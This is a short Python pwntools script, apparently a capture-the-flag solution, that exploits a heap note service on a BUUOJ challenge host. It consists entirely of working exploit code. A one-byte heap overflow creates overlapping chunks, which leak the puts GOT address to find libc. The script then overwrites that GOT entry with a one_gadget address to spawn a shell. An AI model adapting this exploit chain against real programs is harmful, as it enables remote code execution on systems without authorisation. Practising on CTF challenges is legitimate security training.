from pwn import *

io=remote('node3.buuoj.cn',25489)

def add(size,data):
    io.recvuntil('choice :')
    io.sendline('1')
    io.recvuntil('Heap : ')
    io.sendline(str(size))
    io.recvuntil('heap:')
    io.send(data)

def edit(idx,data):
    io.recvuntil('choice :')
    io.sendline('2')
    io.recvuntil('Index :')
    io.sendline(str(idx))
    io.recvuntil('heap :')
    io.send(data)

def free(idx):
    io.recvuntil('choice :')
    io.sendline('4')
    io.recvuntil('Index :')
    io.sendline(str(idx))

def show(idx): 
    io.recvuntil('choice :')
    io.sendline('3')
    io.recvuntil('Index :')
    io.sendline(str(idx))

puts_got=0x602028

add(0x28,'a')#0
add(0x68,'d')#1

free(0)
add(0x60,'c')#0
add(0x60,'b')#2
edit(1,'a'*0x68+p8(0x91))
free(0)
add(0x80,'a'*0x68+p64(0x21)+p64(0x100)+p64(puts_got))#0
show(2)
io.recvuntil('Content : ')
puts_add=u64(io.recv(6).ljust(8,'\x00'))
print(hex(puts_add))
libc_base=puts_add-0x06f690
one_gadget=libc_base+0xf02a4
edit(2,p64(one_gadget))

io.interactive()